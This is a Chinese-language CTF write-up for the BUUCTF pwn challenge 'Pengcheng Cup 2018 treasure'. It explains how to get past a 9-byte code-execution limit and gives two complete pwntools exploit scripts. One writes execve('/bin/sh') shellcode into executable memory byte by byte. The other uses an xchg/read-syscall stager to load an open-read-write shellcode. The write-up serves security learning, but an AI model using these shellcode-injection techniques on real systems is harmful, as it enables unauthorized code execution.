---
title: BUUCTF_鹏城杯_2018_treasure
tags: shellcode
categories: buu刷题
abbrlink: 7bda138
---

这道题不知道我这个方法算不算非预期解，不过做出来之后看其他师傅们的wp感觉自己的方法弱爆了，下面简单分析一下这道题。

## 保护策略：

<img src="https://s2.loli.net/2022/07/22/yK5XANsVgEDZTJU.png" alt="image-20220722114127886" style="zoom:50%;" />

## 程序分析：

<img src="https://s2.loli.net/2022/07/22/NJDx2pEBTPcZl5X.png" alt="image-20220722114157199" style="zoom:50%;" />

这个函数就是出题人准备了一个shellcode，然后放到了一个随机的位置。但是这个shellcode放到的这个位置是不可执行的... 不知道有啥意义，反正我感觉这道题跟这个函数没关系。



<img src="https://s2.loli.net/2022/07/22/yA34E6fTnPr19DF.png" alt="image-20220722114346426" style="zoom:50%;" />

这个函数就是可以输入一个9字节的内容，然后将其执行。只要程序不崩溃，并且不执行break。那就可以无限重复这些代码。

## 大致思路

由于出题人给的那个shellcode也执行不了，所以就不考虑那里了。然后每次只能执行九字节的数据，直接写shellcode肯定是不行的。我们先到函数指针那里调试，看看是什么情况。

![image-20220722114806036](https://s2.loli.net/2022/07/22/9bEw5lF6gLaPjyr.png)

调试发现，存在可写同时还可执行的内存只有0x7fffff7ff6000这一段内存。那么思路肯定是把shellcode写到这片内存，然后将其执行。

但是貌似没法用函数来写shellcode，然后我就考虑自己编写一段汇编，然后将shellcode的机器码一字节一字节写到这片内存。同时观察此时的寄存器rdx(如下图)，发现rdx的值就是可执行内存的地址。

![image-20220722115221760](https://s2.loli.net/2022/07/22/lhXn4tUZoL7qsxc.png)

然后我编写了下面这段汇编代码

```assembly
push 0x48
pop [rdx+0x20]
ret
```

这段汇编的意思就是说把0x48写到rdx+0x20指向的内存，然后执行ret指令。这个0x48也就是shellcode的机器码中的一个字节，然后不断循环，下次写入到[rdx+0x21]，依次类推。之所以我放到0x20处，是为了不破坏我们写入的九字节数据(只要不破坏九个字节的数据，偏移是多少都可以)

shellcode的机器码如下  [在线汇编转机器码的网站](https://defuse.ca/online-x86-assembler.htm#disassembly)

![image-20220722115739583](https://s2.loli.net/2022/07/22/WfsnwubMAOcr2zC.png)

然后就用上面的方法把这个shellcode一字节一字节的写入。

举个例子，第一次执行push 0x48;pop [rdx+0x20];ret的时候，就转成对应机器码

<img src="https://s2.loli.net/2022/07/22/EyP2wMzqDeKXB8p.png" alt="image-20220722115953307" style="zoom:33%;" />

然后payload这么写

```python
p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x48\x8F\x42\x20\xC3')
```

依次类推，将shellcode一个字节一个字节写入即可。

最后将shellcode写完的时候，执行下面的汇编指令(转成机器码)跳转到shellcode上即可。

```
add rdx,0x20
jmp rdx
```

效果如下，此时jmp rdx就跳转到了我布置的shellcode上了。

![image-20220722120527335](https://s2.loli.net/2022/07/22/MxuyOCkr4jpRtPq.png)

## EXP：

[tools源码](https://www.cnblogs.com/ZIKH26/articles/16307343.html)

```py
from tools import *
p,e,libc= load("a")
#p=remote('node4.buuoj.cn',29220)
context.arch='amd64'
context.log_level='debug'
p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')

p.sendafter('start!!!!',b'\x6A\x48\x8F\x42\x20\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x31\x58\x48\x89\x42\x21\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x68\xC0\x00\x00\x00\x8F\x42\x22\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x6A\x8F\x42\x23\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x3B\x8F\x42\x24\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x58\x8F\x42\x25\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x48\x8F\x42\x26\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x31\x8F\x42\x27\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x68\xFF\x00\x00\x00\x8F\x42\x28\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x48\x8F\x42\x29\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x68\xBF\x00\x00\x00\x8F\x42\x2A\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x2F\x8F\x42\x2B\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x62\x8F\x42\x2C\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x69\x8F\x42\x2D\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x6E\x8F\x42\x2E\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x2F\x8F\x42\x2F\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x73\x8F\x42\x30\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x68\x8F\x42\x31\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x00\x8F\x42\x32\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x57\x8F\x42\x33\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x54\x8F\x42\x34\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x5F\x8F\x42\x35\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x48\x8F\x42\x36\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x31\x8F\x42\x37\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x68\xF6\x00\x00\x00\x8F\x42\x38\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x48\x8F\x42\x39\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x31\x8F\x42\x3A\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x68\xD2\x00\x00\x00\x8F\x42\x3B\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x0F\x8F\x42\x3C\xC3')

p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x6A\x05\x8F\x42\x3D\xC3')
#debug(p,0x400AB6)
p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x48\x83\xC2\x20\xFF\xE2')
p.interactive()

```

<img src="https://s2.loli.net/2022/07/22/ygNzXT6w8vYr3JL.png" alt="image-20220722120733156" style="zoom: 50%;" />



## 更简单的思路

做出来之后，我去看了其他师傅的wp，发现roderick师傅的思路非常简单和巧妙。[roderick师傅的这篇文章](https://www.cnblogs.com/LynneHuan/p/15229732.html)

用到了xchg这个指令（这个指令的作用就是交换两个寄存器的值）

因为在执行call rdx的时候，rdx就是可执行内存的地址，让它跟rsi寄存器互换一下。由于rax寄存器正好是0，所以执行syscall就相当于read函数往可执行区域去写数据。效果如下图

![image-20220722121138002](https://s2.loli.net/2022/07/22/284NKCPMorVikBR.png)

这样就可以直接往可执行的这片内存写入数据了。(我又让rsi加了9，这样就直接写到了紧接着syscall指令的地方)这样syscall执行完，直接就执行我写入的数据了 效果如下图

<img src="https://s2.loli.net/2022/07/22/AtRf8Xl1MgN9E3e.png" alt="image-20220722121403173" style="zoom:50%;" />

##  EXP:

```py
from tools import *
p,e,libc= load("a")
p=remote('node4.buuoj.cn',29220)
context.arch='amd64'
context.log_level='debug'
#debug(p,0x400AB6)
p.sendlineafter("will you continue?(enter 'n' to quit) :",'d')
p.sendafter('start!!!!',b'\x48\x87\xF2\x48\x83\xC6\x09\x0F\x05')
p.sendline(shellcode_store('orw_64'))
p.interactive()
```

![image-20220722121508169](https://s2.loli.net/2022/07/22/Y2tCNxBViLodyRb.png)